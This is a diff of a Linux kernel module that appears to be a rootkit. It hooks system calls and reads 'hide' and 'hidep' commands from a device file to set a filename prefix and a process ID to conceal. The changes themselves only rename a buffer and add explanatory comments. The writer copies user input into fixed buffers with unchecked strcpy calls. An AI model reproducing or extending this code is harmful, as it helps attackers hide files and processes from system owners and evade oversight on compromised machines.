@@ -26,21 +26,20 @@ MODULE_VERSION("0.3");
 
 
 #define DEVICE_SIZE 512
-char data[DEVICE_SIZE] = "no data has been written yet";
-char hide_pid[NAME_MAX];
-char PREFIX[DEVICE_SIZE] = "asdfasdfasdfasdfasdf";
+char last_data[DEVICE_SIZE] = "no data has been written yet"; // last written data from userspace
+char hide_pid[NAME_MAX]; // pid to hide
+char PREFIX[DEVICE_SIZE] = "asdfasdfasdfasdfasdf"; // filename prefix to hide
 
-#ifdef CONFIG_X86_64
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
-#define PTREGS_SYSCALL_STUB 1
-typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
-const int ACTIVE_HOOKS_SIZE = 4;
-//static ptregs_t orig_kill;
+#ifdef CONFIG_X86_64 /* check if system is 64bit*/
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0) /*check if kernel version uses ptregs_t type for system calls*/
+#define PTREGS_SYSCALL_STUB 1 /*signal 64bit*/
+typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs); /*define type for syscalls functions*/
+const int ACTIVE_HOOKS_SIZE = 4; /*Available number of hooks to store*/
 typedef struct HOOK {
     int call;
     void * f_ptr;
     ptregs_t original;
-} HOOK;
+} HOOK; /*defiine structure to keep hooks by syscall, pointer to new function, pointer to original function*/
 #else
 typedef asmlinkage long (*syscall_old_t)(pid_t pid, int sig); ////change!!!
 syscall_old_t orig_kill;
@@ -312,11 +311,11 @@ static int cleanup(void){
 
 ssize_t reader(struct file *filep,char *buff,size_t count,loff_t *offp)
 {
-    if (copy_to_user(buff, data, strlen(data)) != 0) {
+    if (copy_to_user(buff, last_data, strlen(last_data)) != 0) {
         printk("Kernel -> userspace copy failed!\n");
         return -1;
     }
-    return strlen(data);
+    return strlen(last_data);
 }
 
 
@@ -329,17 +328,17 @@ ssize_t writer(struct file *filep,const char *buff,size_t count,loff_t *offp)
     }
     if(memcmp("hide ", tmpdata, strlen("hide ")) == 0){
         if(strlen(tmpdata) > strlen("hide ") + 3){
-            strcpy(data, tmpdata + strlen("hide "));
-            strcpy(PREFIX, data);
+            strcpy(last_data, tmpdata + strlen("hide "));
+            strcpy(PREFIX, last_data);
         }
     }
     if(memcmp("hidep ", tmpdata, strlen("hidep ")) == 0){
         if(strlen(tmpdata) > strlen("hidep ")){
-            strcpy(data, tmpdata + strlen("hidep "));
-            strcpy(hide_pid, data);
+            strcpy(last_data, tmpdata + strlen("hidep "));
+            strcpy(hide_pid, last_data);
         }
     }
-    printk(KERN_INFO "%s", data);
+    printk(KERN_INFO "%s", last_data);
     return 0;
 }
 
